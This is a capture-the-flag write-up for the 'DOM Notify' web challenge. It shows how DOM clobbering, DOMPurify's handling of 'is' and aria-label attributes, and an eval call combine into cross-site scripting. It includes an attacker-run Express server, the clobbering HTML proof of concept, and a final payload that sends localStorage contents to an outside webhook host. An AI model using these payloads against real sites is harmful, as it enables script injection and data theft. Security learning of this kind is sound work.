## TFC CTF 2025 writeup - DOM Notify

## Challenge Description
![](dm1.png)

we are given this a simple note app again where we can insert our content and see the notes.. and this app is not session maintained. The input we give is sanitized using the DOM Purify with the config options below
```js
    content = DOMPurify.sanitize(content, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'div', 'span'],
        ALLOWED_ATTR: ['id', 'class', 'name', 'href', 'title']
    });
```
and looking at the main.js.. 

```javascript
// window.custom_elements.enabled = true;
const endpoint = window.custom_elements.endpoint || '/custom-divs';

async function fetchCustomElements() {
    console.log('Fetching elements');
    
    const response = await fetch(endpoint);
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const customElements = await response.json();
    console.log('Custom Elements fetched:', customElements);

    return customElements;
}

function createElements(elements) {
    console.log('Registering elements');
    
    for (var element of elements) {
        // Registers a custom element
        console.log(element)
        customElements.define(element.name, class extends HTMLDivElement {
            static get observedAttributes() { 
                if (element.observedAttribute.includes('-')) {
                    return [element.observedAttribute]; 
                }

                return [];
            }
            
            attributeChangedCallback(name, oldValue, newValue) {
                // Log when attribute is changed
                eval(`console.log('Old value: ${oldValue}', 'New Value: ${newValue}')`)
            }
        }, { extends: 'div' });
    }
}

// When the DOM is loaded
document.addEventListener('DOMContentLoaded', async function () {
    const enabled = window.custom_elements.enabled || false;
    
    // Check if the custom div functionality is enabled
    if (enabled) {
        var customDivs = await fetchCustomElements();
        createElements(customDivs);
    }
});

```

the javascript fetches a JSON from an endpoint and the JSON contains a set of custom elements which is then defined and extended as `div`.  

For example.. an element `fancy-div` is defined and extended to div... so one can use the `<div is=fancy-div>` to inherit the features of fancy div....

And here the special features of the custom elements are that it puts attribute name(not value) that includes `-` into its observed attributes list and where the attribute value is changed the following line is triggered
```
eval(`console.log('Old value: ${oldValue}', 'New Value: ${newValue}')`)
```
But the whole feature seems to be disabled. 

## Finding Bugss
Straight forward we see the DOM Clobbering bugs👾 that helps us enable the feature and we can also clobber the endpoint value so the custom element and the observed attribute can be controlled by  attacker owned server. 

Now the important part.. what custom-element and observed attribute can be set... ? 

Turns out Dom Purify allows certain set of attributes even though a whitelist config is given. Here is an example
![](dm2.png)

![](dm3.png)

But the DOM Purify strips the value of is attribute.. here is where this line in utils.js comes to rescue..  `content = content.replace(/""/g, 'invalid-value');`

See how the is attribute's value is changed...

![](dm4.png)

![](dm5.png)

And the DOM Purify also allows `aria-label` attribute without stripping the value... i also read the documentation of `customElements.define` 

![](dm9.png)

So we dont have to go through the suffering of making the value of observed attribute changing.. just initialzing is enough.. 😫 And eval is an obvious one. We can inject js into the eval to trigger xss👾.

## Attack Plan

1. We Clobber the value of `window.custom_elements.enabled`  and `window.custom_elements.endpoint`  with a server controlled by attacker. 
2. we create the server that returns the JSON `{ name: 'invalid-value', observedAttribute: 'aria-label' }` making sure it has header `Access-Control-Allow-Origin` with `*`
```
const express = require('express');
const app = express();
const PORT = 3838;

// Middleware to add CORS headers
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // allow all origins
  next();
});

// Route to serve your custom elements JSON
app.get('/custom-divs', (req, res) => {
  const customElements = [
    { name: 'invalid-value', observedAttribute: 'aria-label' }
  ];
  res.json(customElements);
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running at http://localhost:${PORT}`);
});
```
3.Making sure we can control the value injected in eval using the following PoC
```
<a id="custom_elements">


<a id="custom_elements" name="enabled"></a>
<a id="custom_elements" name="endpoint" href="http://7df4af886a2c90.lhr.life/custom-divs"></a>
</a>

<div is="" aria-label="sasadsa"></div>

```
![](dm6.png)

6. sasadsa!!! Now replace it with `');alert(1);//`
7. dOne
![](dm7.png)


## Solution

```
<a id="custom_elements">


<a id="custom_elements" name="enabled"></a>
<a id="custom_elements" name="endpoint" href="https://eb4c6d3f5ecff9.lhr.life/custom-divs"></a>
</a>

<div is="" aria-label="');setTimeout(()=>{window.location='https://webhook.com/'+localStorage.flag},300);//"></div>
```

## Conclusion
Had so much solving it.... easy one tho. If you are not clear about Dom clobbering a url value.. check out portswigger DOM clobbering lessons.. and if anything else email me.

## Flag
![](dm8.png)

`TFCCTF{t0_1s_0r_n0t_to_1s}`
